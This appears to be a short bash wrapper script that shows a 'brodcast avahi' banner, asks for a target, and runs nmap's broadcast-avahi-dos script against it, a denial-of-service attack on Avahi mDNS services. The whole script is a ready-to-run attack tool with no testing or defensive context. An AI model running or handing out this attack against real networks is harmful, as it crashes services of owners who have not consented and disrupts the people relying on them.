figlet brodcast avahi
echo " "
read -p "Target: " t
nmap --script broadcast-avahi-dos $t
